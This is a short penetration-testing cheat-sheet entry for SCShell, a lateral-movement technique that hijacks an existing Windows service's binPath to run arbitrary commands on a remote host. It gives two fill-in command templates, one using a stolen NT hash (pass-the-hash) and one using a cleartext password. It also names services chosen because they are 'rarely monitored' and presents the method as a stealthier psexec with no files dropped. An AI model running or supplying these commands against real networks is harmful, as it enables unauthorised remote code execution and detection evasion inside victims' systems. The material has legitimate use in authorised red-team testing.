# SCShell

Stealthy alternative to psexec — reconfigures an existing service's binPath to your command, triggers a service restart, then restores the original binPath. No new service, no SMB share writes, no `.bat` drops.

### Run command via service hijack

Hijack `$service_name` (often `XblAuthManager` or `defragsvc` because they're start-on-demand and rarely monitored) to run `$cmd`.

```sh title:"Hijack existing service binPath to run arbitrary command"
scshell.py -service-name $service_name -hashes :$nt_hash $domain/$user@$rhost_ip
```
<!-- cheat
import domain_ip
import users
var service_name = printf '%s\n' 'XblAuthManager' 'defragsvc' --- --header 'Service to hijack'
var nt_hash
-->

### With password

Same hijack flow but pass-by-password rather than NT hash.

```sh title:"SCShell service hijack with cleartext password"
scshell.py -service-name $service_name $domain/$user:$pass@$rhost_ip
```
<!-- cheat
import domain_ip
import users
var service_name = printf '%s\n' 'XblAuthManager' 'defragsvc' --- --header 'Service to hijack'
var pass
-->
